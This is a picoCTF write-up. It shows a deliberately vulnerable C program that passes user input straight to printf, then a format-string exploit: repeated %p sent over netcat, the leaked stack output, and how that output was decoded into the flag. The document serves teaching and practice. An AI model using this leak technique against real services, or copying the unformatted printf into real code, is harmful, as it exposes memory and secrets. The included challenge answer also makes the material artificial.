# Description: 
I'm just copying and pasting with this `program`. What can go wrong? 

You can view source `here`. And connect with it using: `nc saturn.picoctf.net 60610`

This is the program provided:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
# Solution:
After going through the program, it is undeerstood that the lines of code needed to crack this challenge are: 
`scanf("%127s", story);` and the pointer `buf` in function _readflag_. `buf` is a character array pointer which will store the contents of `flag.txt` file.
Since this is a pointer, the format specifier `%p` can be used to print the address of the pointer `buf` in hexadecimal.
so, in the netcat connection, I did this:
```
yasho@DESKTOP-6ND4URA:~$ nc saturn.picoctf.net 55490
Tell me a story and then I'll tell you one >> %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Here's a story -
0xffd50a300xffd50a500x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x395f6b630x303666350x7d3731360xfbad20000xd9240b00(nil)0xeac2b9900x804c0000x8049410(nil)0x804c0000xffd50b180x80494180x20xffd50bc40xffd50bd0(nil)0xffd50b30(nil)(nil)0xeaa21ed5
```
I gave %p as input (128 times since the story's length is 128).
Now I converted this address to its raw value i.e. UTF-8 using codechef. 
Output:
```
ÿÕ
0ÿÕ
PI4p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%%p%ocip{FTCk43L_gn1g4lFff0_4tS_9_kc06f5}716û­ 
```
Can see that the flag is present but in a werid way. It follows the pattern of reversing every block of 4 characters. So I manually modified this string accordingly.

`ocip{FTCk43L_gn1g4lFff0_4tS_9_kc06f5}716` ----> `picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}`
